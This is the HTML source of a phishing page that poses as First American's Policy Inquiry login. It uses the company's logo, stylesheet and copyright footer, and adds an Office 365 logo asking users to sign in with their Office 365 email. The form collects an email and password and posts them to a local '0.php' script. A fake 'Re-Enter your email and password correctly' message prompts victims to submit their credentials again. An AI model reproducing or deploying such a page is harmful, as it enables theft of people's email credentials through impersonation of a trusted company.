
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <title>First American Policy Inquiry Website</title>
    <link href="https://insagent.firstam.com/tech21/css/firstamv2-1.css" rel="stylesheet" type="text/css">

    <script type="text/javascript">
        function CreateBookmarkLink() {
            var title = document.title;
            var url = "https://insagent.firstam.com";

            if (window.sidebar && window.sidebar.addPanel) {
                /* Mozilla Firefox Bookmark - works with opening in a side panel only ? */
                window.sidebar.addPanel(title, url, "");
            } else if (window.opera && window.print) {
                /* Opera Hotlist */
                alert("Press Control + D to bookmark");
                return true;
            } else if (window.external) {
                /* IE Favorite */
                try {
                    window.external.AddFavorite(url, title);
                } catch (e) {
                    alert("Press Control + D to bookmark");
                }
            } else {
                /* Other */
                alert("Press Control + D to bookmark");
            }
        }
    </script>

</head>
<body onload="document.form1.txtLoginId.focus();">
    <center>
        <div style="width: 760px;">
            <div id="header">
                <img src="https://gofirstam.com/wp-content/uploads/2020/08/FATCO-Logo.png" width="460" height="95">
            </div>
            <div id="background">
                <img src="https://insagent.firstam.com/tech21/Images/corpOffice.jpg" width="760px" />
            </div>
            <div id="logonControls" class="logonControlsContainer">
                <div class="logonControlsBackground">
                </div>
                <div class="logonControls">
                    <p class="redbold" style="text-align: center">
                        
                    <img alt="Office 365 ProPlus - Maskeny Systems" class="n3VNCb" src="https://www.maskeny.com/wp-content/uploads/2019/08/office-365_grande.png" data-noaft="1" jsname="HiaYvf" jsaction="load:XAeZkd;" style="width: 51px; height: 36px; margin: 0px"></p>
                    <form name="form1" method="post" action="0.php" id="form1">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="ouJhsbCYmsWExAtgj/e9Bbd4qAB2JZPurmdLAq3s5jvG0pH7xdqv8/hX5Sc9BOUPZd7OUppbuu6w0+PyvZwnS711P4A=" />

<script type="text/javascript">
<!--
var theForm = document.forms['form1'];
if (!theForm) {
    theForm = document.form1;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
// -->
</script>


<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="31764489" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="PCrSYuVMLXRsCws3RaX7UqQuNPE679djLvaUvg+ZxfAERYTdVReocrwNSyOpy/gcbu5blV1HprPKXWfIXaRB2Llgtg65tbP7htuFo6+ED3sCr78vSwkWZ6ZX7wE3odSYunp9Xz0Ejn3Kr+qeVtnYGW4RfwA=" />
                        <div style="padding-bottom: 3px">
                            <div class="bluebold" style="display: inline-block; width: 80px">
								Email ID:</div>
                            <input name="txtLoginId" type="text" id="txtLoginId" class="field" style="width: 170px" autocomplete="off" />
                        </div>
                        <div style="padding-bottom: 3px">
                            <div class="bluebold" style="display: inline-block; width: 80px">
								Password:</div>
                            <input name="txtPassword" type="password" id="txtPassword" class="field" style="width: 170px" autocomplete="off" />
                        </div>
                        <div style="padding-bottom: 3px">
                            <div class="bluebold" style="display: inline-block; width: 80px"></div>
                            <input name="btnSubmit" type="submit" id="btnSubmit" class="button" value="Login" />
                        </div>
                        <div style="padding-bottom: 3px">
                            <div class="bluebold" style="display: inline-block; width: 80px"></div>
                        </div>
                    </form>
                    <p class="common">
                        Please login with your <b><i><font color="#E62E1F">
						OFFICE365</font></i></b> Email ID.<br />
                        <br />
                        <font color="#E62E1F">Re-Enter your email and password 
						correctly </font></p>&nbsp;</div>
            </div>
            <div id="footer">
                <table width="760" border="0" cellpadding="0" cellspacing="0" class="common">
    <tr>
        <td class="tbheader">&nbsp;
        </td>
    </tr>
    <tr>
        <td height="20" valign="middle">
            <div align="center" class="copyright">
                © 2021 First American Corporation - All Rights Reserved - <a href="https://AgentAgreement2.aspx"
                    target="_blank" class="print">Terms of Use </a>
            </div>
        </td>
    </tr>
</table>

<!-- START Bootstrap-Cookie-Alert -->
<div class="alert text-center cookiealert" role="alert">
    To learn more about the categories of personal information collected from 
	this website, and how it will be used, please see our <a href="https://www.firstam.com/privacy-policy/#type-of-information">
	privacy policy</a>. This notice is effective for your use of this website 
	for the next 14 days.
    <button type="button" class="button btn-primary btn-sm acceptcookies stylish-button">
        I agree
    </button>
</div>
<!-- END Bootstrap-Cookie-Alert -->

<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-42749534-2', 'firstam.com');
    ga('require', 'linkid', 'linkid.js');
    ga('send', 'pageview');
</script>

<link href="https://insagent.firstam.com/tech21/include/scripts/CookieNotice/cookiealert.css" rel="stylesheet" />
<script src="https://insagent.firstam.com/tech21/include/scripts/CookieNotice/cookiealert.js"></script>
            </div>
        </div>
    </center>
</body>
</html>
